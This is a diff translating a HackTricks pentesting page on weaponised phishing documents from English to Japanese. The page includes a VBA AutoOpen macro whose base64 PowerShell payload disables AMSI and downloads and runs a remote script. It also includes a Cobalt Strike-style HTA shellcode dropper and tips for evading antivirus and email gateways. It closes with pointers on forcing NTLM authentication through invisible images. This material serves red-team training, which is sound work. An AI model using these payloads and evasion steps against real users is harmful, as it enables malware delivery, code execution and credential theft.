@@ -1,65 +1,62 @@
-# Phishing Files & Documents
+# フィッシングファイルとドキュメント
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手したい**ですか、またはHackTricksをPDFでダウンロードしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクション
+* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **ハッキングのトリックを共有するために、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。
 
 </details>
 
-## Office Documents
+## オフィスドキュメント
 
-Microsoft Word performs file data validation before opening a file. Data validation is performed in the form of data structure identification, against the OfficeOpenXML standard. If any error occurs during the data structure identification, the file being analysed will not be opened.
+Microsoft Wordは、ファイルを開く前にファイルデータの検証を行います。データの検証は、OfficeOpenXML標準に対してデータ構造の識別として行われます。データ構造の識別中にエラーが発生した場合、分析対象のファイルは開かれません。
 
-Usually, Word files containing macros use the `.docm` extension. However, it's possible to rename the file by changing the file extension and still keep their macro executing capabilities.\
-For example, an RTF file does not support macros, by design, but a DOCM file renamed to RTF will be handled by Microsoft Word and will be capable of macro execution.\
-The same internals and mechanisms apply to all software of the Microsoft Office Suite (Excel, PowerPoint etc.).
+通常、マクロを含むWordファイルは`.docm`拡張子を使用します。ただし、ファイルの拡張子を変更してもマクロの実行機能を保持することができます。\
+たとえば、RTFファイルは設計上マクロをサポートしていませんが、RTFに名前を変更したDOCMファイルはMicrosoft Wordで処理され、マクロの実行が可能になります。\
+同じ内部構造とメカニズムは、Microsoft Office Suiteのすべてのソフトウェア（Excel、PowerPointなど）に適用されます。
 
-You can use the following command to check which extensions are going to be executed by some Office programs:
-
+次のコマンドを使用して、いくつかのOfficeプログラムで実行される拡張子を確認できます：
 ```bash
 assoc | findstr /i "word excel powerp"
 ```
+DOCXファイルは、マクロを含むリモートテンプレート（ファイル - オプション - アドイン - 管理：テンプレート - 移動）を参照することができ、マクロを「実行」することもできます。
 
-DOCX files referencing a remote template (File –Options –Add-ins –Manage: Templates –Go) that includes macros can “execute” macros as well.
+### 外部画像の読み込み
 
-### External Image Load
-
-Go to: _Insert --> Quick Parts --> Field_\
-_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://\<ip>/whatever
+次に進みます：_挿入 --> クイックパーツ --> フィールド_\
+_**カテゴリ**: リンクと参照, **フィールド名**: includePicture, **ファイル名またはURL**:_ http://\<ip>/whatever
 
 ![](<../../.gitbook/assets/image (316).png>)
 
-### Macros Backdoor
+### マクロのバックドア
 
-It's possible to use macros to run arbitrary code from the document.
+マクロを使用してドキュメントから任意のコードを実行することができます。
 
-#### Autoload functions
+#### 自動ロード関数
 
-The more common they are, the more probable the AV will detect them.
+一般的な関数ほど、AVに検出される可能性が高くなります。
 
 * AutoOpen()
 * Document\_Open()
 
-#### Macros Code Examples
-
+#### マクロのコード例
 ```vba
 Sub AutoOpen()
-    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
+CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
 End Sub
 ```
 
 ```vba
 Sub AutoOpen()
 
-  Dim Shell As Object
-  Set Shell = CreateObject("wscript.shell")
-  Shell.Run "calc"
+Dim Shell As Object
+Set Shell = CreateObject("wscript.shell")
+Shell.Run "calc"
 
 End Sub
 ```
@@ -68,8 +65,8 @@ End Sub
 Dim author As String
 author = oWB.BuiltinDocumentProperties("Author")
 With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
- .StdIn.WriteLine author
- .StdIn.WriteBlackLines 1
+.StdIn.WriteLine author
+.StdIn.WriteBlackLines 1
 ```
 
 ```vba
@@ -77,88 +74,85 @@ Dim proc As Object
 Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
 proc.Create "powershell <beacon line generated>
 ```
+#### メタデータの手動削除
 
-#### Manually remove metadata
+**ファイル > 情報 > ドキュメントの検査 > ドキュメントの検査**に移動し、ドキュメント検査ツールを表示します。**検査**をクリックし、**ドキュメントのプロパティと個人情報**の横にある**すべて削除**をクリックします。
 
-Fo to **File > Info > Inspect Document > Inspect Document**, which will bring up the Document Inspector. Click **Inspect** and then **Remove All** next to **Document Properties and Personal Information**.
+#### ドキュメントの拡張子
 
-#### Doc Extension
+作業が終了したら、**保存形式**のドロップダウンメニューから**`.docx`**を**Word 97-2003 `.doc`**に変更します。\
+これは、**マクロを`.docx`内に保存することはできない**ため、マクロ有効な**`.docm`**拡張子には**スティグマ**があります（たとえば、サムネイルアイコンには大きな`!`が表示され、一部のウェブ/メールゲートウェイで完全にブロックされます）。したがって、この**古い`.doc`拡張子が最善の妥協策**です。
 
-When finished, select **Save as type** dropdown, change the format from **`.docx`** to **Word 97-2003 `.doc`**.\
-Do this because you **can't save macro's inside a `.docx`** and there's a **stigma** **around** the macro-enabled **`.docm`** extension (e.g. the thumbnail icon has a huge `!` and some web/email gateway block them entirely). Therefore, this **legacy `.doc` extension is the best compromise**.
-
-#### Malicious Macros Generators
+#### 悪意のあるマクロ生成ツール
 
 * MacOS
-  * [**macphish**](https://github.com/cldrn/macphish)
-  * [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)
+* [**macphish**](https://github.com/cldrn/macphish)
+* [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)
 
-## HTA Files
+## HTAファイル
 
-An HTA is a proprietary Windows program whose **source code consists of HTML and one or more scripting languages** supported by Internet Explorer (VBScript and JScript). HTML is used to generate the user interface and the scripting language for the program logic. An **HTA executes without the constraints of the browser's security model**, so it executes as a "fully trusted" application.
+HTAは、**HTMLと1つ以上のスクリプト言語**（VBScriptとJScript）で構成されるWindowsプログラムです。HTMLはユーザーインターフェースとプログラムロジックの生成に使用されます。HTAは、ブラウザのセキュリティモデルの制約なしで実行されるため、「完全に信頼された」アプリケーションとして実行されます。
 
-An HTA is executed using **`mshta.exe`**, which is typically **installed** along with **Internet Explorer**, making **`mshta` dependant on IE**. So if it has been uninstalled, HTAs will be unable to execute.
-
+HTAは、通常**Internet Explorerと一緒にインストール**される**`mshta.exe`**を使用して実行されます。したがって、IEがアンインストールされている場合、HTAは実行できません。
 ```html
 <--! Basic HTA Execution -->
 <html>
-  <head>
-    <title>Hello World</title>
-  </head>
-  <body>
-    <h2>Hello World</h2>
-    <p>This is an HTA...</p>
-  </body>
+<head>
+<title>Hello World</title>
+</head>
+<body>
+<h2>Hello World</h2>
+<p>This is an HTA...</p>
+</body>
 
-  <script language="VBScript">
-    Function Pwn()
-      Set shell = CreateObject("wscript.Shell")
-      shell.run "calc"
-    End Function
+<script language="VBScript">
+Function Pwn()
+Set shell = CreateObject("wscript.Shell")
+shell.run "calc"
+End Function
 
-    Pwn
-  </script>
+Pwn
+</script>
 </html>
 ```
 
 ```html
 <--! Cobal Strike generated HTA without shellcode -->
 <script language="VBScript">
-	Function var_func()
-		var_shellcode = "<shellcode>"
+Function var_func()
+var_shellcode = "<shellcode>"
 
-		Dim var_obj
-		Set var_obj = CreateObject("Scripting.FileSystemObject")
-		Dim var_stream
-		Dim var_tempdir
-		Dim var_tempexe
-		Dim var_basedir
-		Set var_tempdir = var_obj.GetSpecialFolder(2)
-		var_basedir = var_tempdir & "\" & var_obj.GetTempName()
-		var_obj.CreateFolder(var_basedir)
-		var_tempexe = var_basedir & "\" & "evil.exe"
-		Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
-		For i = 1 to Len(var_shellcode) Step 2
-		    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
-		Next
-		var_stream.Close
-		Dim var_shell
-		Set var_shell = CreateObject("Wscript.Shell")
-		var_shell.run var_tempexe, 0, true
-		var_obj.DeleteFile(var_tempexe)
-		var_obj.DeleteFolder(var_basedir)
-	End Function
+Dim var_obj
+Set var_obj = CreateObject("Scripting.FileSystemObject")
+Dim var_stream
+Dim var_tempdir
+Dim var_tempexe
+Dim var_basedir
+Set var_tempdir = var_obj.GetSpecialFolder(2)
+var_basedir = var_tempdir & "\" & var_obj.GetTempName()
+var_obj.CreateFolder(var_basedir)
+var_tempexe = var_basedir & "\" & "evil.exe"
+Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
+For i = 1 to Len(var_shellcode) Step 2
+var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
+Next
+var_stream.Close
+Dim var_shell
+Set var_shell = CreateObject("Wscript.Shell")
+var_shell.run var_tempexe, 0, true
+var_obj.DeleteFile(var_tempexe)
+var_obj.DeleteFolder(var_basedir)
+End Function
 
-	var_func
-	self.close
+var_func
+self.close
 </script>
 ```
+## NTLM認証の強制
 
-## Forcing NTLM Authentication
+**リモートでNTLM認証を強制する方法はいくつかあります**。たとえば、ユーザーがアクセスするメールやHTMLに**見えない画像**を追加することができます（HTTP MitMでも可能ですか？）。または、被害者に**フォルダを開くだけで認証をトリガーするファイルのアドレス**を送信することもできます。
 
-There are several ways to **force NTLM authentication "remotely"**, for example, you could add **invisible images** to emails or HTML that the user will access (even HTTP MitM?). Or send the victim the **address of files** that will **trigger** an **authentication** just for **opening the folder.**
-
-**Check these ideas and more in the following pages:**
+**以下のページでこれらのアイデアやその他の情報をチェックしてください:**
 
 {% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
 [printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
@@ -168,21 +162,21 @@ There are several ways to **force NTLM authentication "remotely"**, for example,
 [places-to-steal-ntlm-creds.md](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md)
 {% endcontent-ref %}
 
-### NTLM Relay
+### NTLMリレー
 
-Don't forget that you cannot only steal the hash or the authentication but also **perform NTLM relay attacks**:
+ハッシュや認証情報だけでなく、**NTLMリレーアタックも実行できることを忘れないでください**:
 
-* [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
-* [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
+* [**NTLMリレーアタック**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
+* [**AD CS ESC8（証明書へのNTLMリレー）**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
+* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォロー**してください。
+* **ハッキングのトリックを共有するには、[hacktricks repo](https://github.com/carlospolop/hacktricks)と[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。
 
 </details>
